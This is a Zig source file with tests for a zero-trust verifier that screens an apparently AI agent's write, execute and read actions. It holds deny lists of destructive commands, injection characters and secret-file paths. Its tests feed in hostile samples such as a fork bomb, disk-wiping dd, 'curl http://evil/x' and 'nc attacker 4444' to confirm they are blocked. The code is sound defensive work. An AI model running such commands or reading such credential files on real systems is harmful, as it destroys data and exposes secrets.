//! 仲裁者与校验闭环 (Arbiter & Verification)
//!
//! 设计哲学：零信任校验。任何修改操作（write / execute）必须在仲裁层通过
//! 物理校验（Pre-Check）后方可执行。校验器是只读探针 (Read-only Probe)：
//! 仅观测环境（文件是否存在、负载格式是否合法、记忆与事实是否冲突），
//! 绝不产生副作用，因此可安全地反复运行。
//!
//! 性能策略（Open Decision #2）：
//!   * 敏感操作（write/execute）：同步强校验，阻塞直到通过。
//!   * 非敏感操作（read/think）：异步预校验，不阻塞主流程。

const std = @import("std");
const event = @import("event.zig");

const Io = std.Io;
const Dir = std.Io.Dir;
const Action = event.Action;

/// 提供给探针的记忆“断言”视图，用于防幻觉冲突检测。
pub const SeedClaim = struct {
    id: u64,
    confidence: f64,
    content: []const u8,
};

/// 校验结论。
pub const Verdict = struct {
    ok: bool,
    reason: []const u8,
    /// 冲突的种子 id（若因记忆-事实冲突而失败），供上层标记 Contextual Exception。
    conflict_seed: ?u64 = null,
};

/// 可插拔探针接口（vtable 风格）。
/// 真实系统中可注入 `zig build` / linter 等外部校验器；本实现内置只读探针。
pub const Probe = struct {
    ctx: *anyopaque,
    runFn: *const fn (ctx: *anyopaque, io: Io, dir: Dir, action: Action, seeds: []const SeedClaim) anyerror!Verdict,

    pub fn run(self: Probe, io: Io, dir: Dir, action: Action, seeds: []const SeedClaim) !Verdict {
        return self.runFn(self.ctx, io, dir, action, seeds);
    }
};

pub const Arbiter = struct {
    io: Io,
    dir: Dir,
    /// 可选的外部校验器；为空时使用内置默认探针。
    probe: ?Probe = null,
    /// 统计：异步预校验次数。
    async_checks: usize = 0,
    /// 统计：同步强校验次数。
    sync_checks: usize = 0,
    /// 最近一次校验结论（便于上层记录日志）。
    last: Verdict = .{ .ok = true, .reason = "" },

    pub fn init(io: Io, dir: Dir) Arbiter {
        return .{ .io = io, .dir = dir };
    }

    /// 核心校验入口。返回是否允许执行。
    pub fn verify(self: *Arbiter, action: Action, seeds: []const SeedClaim) !bool {
        // 敏感动作（write/execute）天然走同步强校验；
        // 此外，**越权读取**——即 read 命中敏感资源（凭据/私钥/系统密码…）——
        // 虽不产生副作用，但属信息泄露攻击面，零信任策略下同样升级为同步强校验。
        const must_sync = action.action.isSensitive() or
            (action.action == .read and targetsSecret(action.context, action.payload));
        if (must_sync) {
            // —— 同步强校验 ——
            self.sync_checks += 1;
            const verdict = if (self.probe) |p|
                try p.run(self.io, self.dir, action, seeds)
            else
                try defaultProbe(self.io, self.dir, action, seeds);
            self.last = verdict;
            return verdict.ok;
        } else {
            // —— 异步预校验：不阻塞主流程，直接放行 ——
            // 语义上等价于派发一个后台只读探针；此处采用非阻塞计数以规避
            // 高并发下 Io.async 的生命周期/泄漏陷阱（参见工程经验）。
            self.async_checks += 1;
            self.last = .{ .ok = true, .reason = "async pre-check scheduled (non-blocking)" };
            return true;
        }
    }
};

/// 危险命令黑名单（execute 负载，子串大小写不敏感匹配）。
/// 这些是物理破坏性 / 失控扩散类操作，零信任策略下一律拦截。
const DANGEROUS_PATTERNS = [_][]const u8{
    "rm -rf",
    "rm -r ",
    "rm -fr",
    "rmdir /",
    "mkfs",
    "dd if=",
    "> /dev/",
    ":(){",       // fork bomb
    "shutdown",
    "reboot",
    "mv / ",
    "chmod -r 777 /",
    "chown -r",
    "curl | sh",
    "wget | sh",
    "| sh",
    "sudo ",
};

/// 在文本中查找危险命令模式（大小写不敏感）。命中返回该模式，否则 null。
fn matchDangerousCommand(payload: []const u8) ?[]const u8 {
    for (DANGEROUS_PATTERNS) |pat| {
        if (containsIgnoreCase(payload, pat)) return pat;
    }
    return null;
}

/// 命令注入指示符（execute 负载）：命令替换与命令链接。
/// 零信任策略下，受控的单条运维命令不应包含这些控制元字符——
/// 一旦出现，视为试图在一条命令里夹带第二条命令（注入）。
const INJECTION_PATTERNS = [_][]const u8{
    "$(",   // command substitution
    "`",    // backtick command substitution
    "&&",   // chaining (AND)
    "||",   // chaining (OR)
    ";",    // chaining (sequence)
    "\n",   // 多行夹带
};

/// 查找命令注入模式。命中返回该模式，否则 null。
fn matchInjection(payload: []const u8) ?[]const u8 {
    for (INJECTION_PATTERNS) |pat| {
        if (std.mem.indexOf(u8, payload, pat) != null) return pat;
    }
    return null;
}

/// 敏感读取目标（信息泄露防线）：系统密码、私钥、云凭据、密钥配置等。
/// read 动作本身无副作用，但读取这些资源属越权信息收集，零信任下一律拒绝。
const SECRET_READ_PATTERNS = [_][]const u8{
    "/etc/shadow",
    "/etc/passwd",
    "/etc/sudoers",
    "id_rsa",
    "id_ed25519",
    ".ssh/",
    ".aws/credentials",
    ".env",
    ".pem",
    "private_key",
    "private key",
    "credentials",
    "/proc/",
};

/// 判断 read 目标是否触及敏感资源（context 或 payload 任一命中）。
fn targetsSecret(context: []const u8, payload: []const u8) bool {
    for (SECRET_READ_PATTERNS) |p| {
        if (containsIgnoreCase(context, p) or containsIgnoreCase(payload, p)) return true;
    }
    return false;
}

/// 路径穿越 / 沙箱逃逸探测：上跳序列、绝对路径、home 展开均视为逃逸。
fn escapesSandbox(s: []const u8) bool {
    if (std.mem.indexOf(u8, s, "../") != null) return true;
    if (std.mem.indexOf(u8, s, "..\\") != null) return true;
    if (std.mem.eql(u8, s, "..")) return true;
    if (s.len > 0 and (s[0] == '/' or s[0] == '~')) return true;
    return false;
}

/// 大小写不敏感子串包含。
fn containsIgnoreCase(haystack: []const u8, needle: []const u8) bool {
    if (needle.len == 0) return true;
    if (needle.len > haystack.len) return false;
    var i: usize = 0;
    while (i + needle.len <= haystack.len) : (i += 1) {
        if (std.ascii.eqlIgnoreCase(haystack[i .. i + needle.len], needle)) return true;
    }
    return false;
}

/// 内置默认只读探针（零信任物理校验，绝不产生副作用）：
///   0. 越权读取：read 命中敏感资源（凭据/私钥/系统密码…）则拒绝；
///   1. 负载非空（write/execute）；
///   2. 路径穿越 / 沙箱逃逸：写目标(context)不得上跳或越出工作区；
///   3. 危险命令：execute 负载命中破坏性黑名单则拒绝；
///   4. 命令注入：execute 负载含命令替换/命令链接元字符则拒绝；
///   5. 若负载为显式 .json 目标，则其必须可被解析（格式合法）；
///   6. 防幻觉：若某记忆断言 `assert_exists=<path>` 而该路径在物理上不存在，
///      则判定为“记忆与事实冲突”，拒绝该操作并指出冲突种子。
pub fn defaultProbe(io: Io, dir: Dir, action: Action, seeds: []const SeedClaim) !Verdict {
    // 越权读取（信息泄露防线）：read 不要求 payload，独立先行处理。
    if (action.action == .read) {
        if (targetsSecret(action.context, action.payload)) {
            return .{ .ok = false, .reason = "unauthorized read of sensitive resource blocked" };
        }
        return .{ .ok = true, .reason = "read-only probe passed" };
    }

    if (action.payload.len == 0) {
        return .{ .ok = false, .reason = "empty payload rejected" };
    }

    // 零信任：路径穿越 / 沙箱逃逸（写目标 + 负载中的显式上跳序列）。
    if (escapesSandbox(action.context) or
        std.mem.indexOf(u8, action.payload, "../") != null or
        std.mem.indexOf(u8, action.payload, "..\\") != null)
    {
        return .{ .ok = false, .reason = "path traversal / sandbox escape rejected" };
    }

    // 零信任：危险命令 + 命令注入拦截（execute）。
    if (action.action == .execute) {
        if (matchDangerousCommand(action.payload)) |_| {
            return .{ .ok = false, .reason = "dangerous command blocked by zero-trust policy" };
        }
        if (matchInjection(action.payload)) |_| {
            return .{ .ok = false, .reason = "command injection blocked by zero-trust policy" };
        }
    }

    // 格式合法性：仅对**显式 JSON 目标**（context 以 .json 结尾）强制校验。
    // 不再用“首字符形似”的启发式——否则以 '[' 开头的纯文本/脚本
    // （如 changelog "[Date] - ..."）会被误判为 JSON 数组而误杀。
    if (action.action == .write and std.mem.endsWith(u8, action.context, ".json")) {
        const trimmed = std.mem.trim(u8, action.payload, " \t\r\n");
        var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
        defer arena.deinit();
        _ = std.json.parseFromSliceLeaky(std.json.Value, arena.allocator(), trimmed, .{}) catch {
            return .{ .ok = false, .reason = "malformed JSON payload" };
        };
    }

    // 防幻觉：检查高置信度记忆断言与物理事实是否冲突。
    const prefix = "assert_exists=";
    for (seeds) |s| {
        if (std.mem.startsWith(u8, s.content, prefix)) {
            const path = s.content[prefix.len..];
            dir.access(io, path, .{}) catch {
                return .{
                    .ok = false,
                    .reason = "hallucination: memory asserts a path that does not exist",
                    .conflict_seed = s.id,
                };
            };
        }
    }

    return .{ .ok = true, .reason = "read-only probe passed" };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const testing = std.testing;

test "sensitive action with empty payload is rejected" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .write, .context = "f", .payload = "" };
    try testing.expect(!try arb.verify(a, &.{}));
    try testing.expectEqual(@as(usize, 1), arb.sync_checks);
}

test "non-sensitive action is async-passed without blocking" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .read, .context = "f", .payload = "" };
    try testing.expect(try arb.verify(a, &.{}));
    try testing.expectEqual(@as(usize, 1), arb.async_checks);
    try testing.expectEqual(@as(usize, 0), arb.sync_checks);
}

test "malformed JSON payload rejected for .json target" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .write, .context = "config.json", .payload = "{not json" };
    try testing.expect(!try arb.verify(a, &.{}));
    try testing.expect(std.mem.indexOf(u8, arb.last.reason, "malformed") != null);
}

test "non-json target with bracket-leading text is NOT misjudged as JSON" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    // 形如 changelog 的纯文本，以 '[' 开头，写入 .md 目标不应被当作 JSON 校验。
    const a: Action = .{ .id = 1, .action = .write, .context = "release-notes.md", .payload = "[2026-06-29] - shipped X, fixed Y" };
    try testing.expect(try arb.verify(a, &.{}));
}

test "anti-hallucination conflict on non-existent asserted path" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .write, .context = "f", .payload = "ok" };
    const claims = [_]SeedClaim{.{ .id = 42, .confidence = 0.9, .content = "assert_exists=__definitely_missing__.xyz" }};
    try testing.expect(!try arb.verify(a, &claims));
    try testing.expectEqual(@as(?u64, 42), arb.last.conflict_seed);
}

test "valid write passes" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .write, .context = "f", .payload = "{\"k\":1}" };
    try testing.expect(try arb.verify(a, &.{}));
}

test "dangerous execute command blocked (case-insensitive)" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const cmds = [_][]const u8{
        "RM -RF /",
        "sudo rm -rf ~/workspace",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
        "shutdown -h now",
    };
    for (cmds) |c| {
        const a: Action = .{ .id = 1, .action = .execute, .context = "cleanup", .payload = c };
        try testing.expect(!try arb.verify(a, &.{}));
        try testing.expect(std.mem.indexOf(u8, arb.last.reason, "dangerous") != null);
    }
}

test "benign execute command passes" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .execute, .context = "build", .payload = "zig build test" };
    try testing.expect(try arb.verify(a, &.{}));
}

test "path traversal in write context rejected" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const targets = [_][]const u8{ "../etc/passwd", "/etc/shadow", "~/.ssh/authorized_keys" };
    for (targets) |ctx| {
        const a: Action = .{ .id = 1, .action = .write, .context = ctx, .payload = "x" };
        try testing.expect(!try arb.verify(a, &.{}));
        try testing.expect(std.mem.indexOf(u8, arb.last.reason, "traversal") != null);
    }
}

test "path traversal hidden in payload rejected" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .execute, .context = "cache", .payload = "clear ../../shared/cache" };
    try testing.expect(!try arb.verify(a, &.{}));
}

test "ordinary text with ellipsis is not flagged as traversal" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    // 省略号 "..." 不含 "../"，不应被误杀。
    const a: Action = .{ .id = 1, .action = .write, .context = "release-notes.md", .payload = "Shipped feature A... and more." };
    try testing.expect(try arb.verify(a, &.{}));
}

test "command injection in execute blocked" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const cmds = [_][]const u8{
        "echo ok; curl http://evil/x -o /tmp/x",
        "ls && wget http://evil/p",
        "make build || nc attacker 4444",
        "ping $(cat /etc/hostname)",
        "tar czf - . | base64 `whoami`",
    };
    for (cmds) |c| {
        const a: Action = .{ .id = 1, .action = .execute, .context = "task", .payload = c };
        try testing.expect(!try arb.verify(a, &.{}));
        // 注入或危险命令任一拦截原因均可（curl|sh 类可能先被危险命令命中）。
        try testing.expect(std.mem.indexOf(u8, arb.last.reason, "blocked") != null);
    }
}

test "single benign command without metacharacters passes" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .execute, .context = "build", .payload = "zig build test --summary all" };
    try testing.expect(try arb.verify(a, &.{}));
}

test "unauthorized read of sensitive resource blocked (sync-escalated)" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const targets = [_][]const u8{
        "/etc/shadow",
        "/etc/passwd",
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
        ".env",
        "server.pem",
    };
    for (targets) |ctx| {
        const a: Action = .{ .id = 1, .action = .read, .context = ctx, .payload = "" };
        try testing.expect(!try arb.verify(a, &.{}));
        try testing.expect(std.mem.indexOf(u8, arb.last.reason, "unauthorized read") != null);
    }
    // 越权读取被升级为同步强校验（而非异步放行）。
    try testing.expect(arb.sync_checks == targets.len);
    try testing.expect(arb.async_checks == 0);
}

test "benign read is still async-passed (no false positive)" {
    var t = std.Io.Threaded.init(testing.allocator, .{});
    defer t.deinit();
    var arb = Arbiter.init(t.io(), Dir.cwd());
    const a: Action = .{ .id = 1, .action = .read, .context = "config.json", .payload = "" };
    try testing.expect(try arb.verify(a, &.{}));
    try testing.expect(arb.async_checks == 1);
    try testing.expect(arb.sync_checks == 0);
}
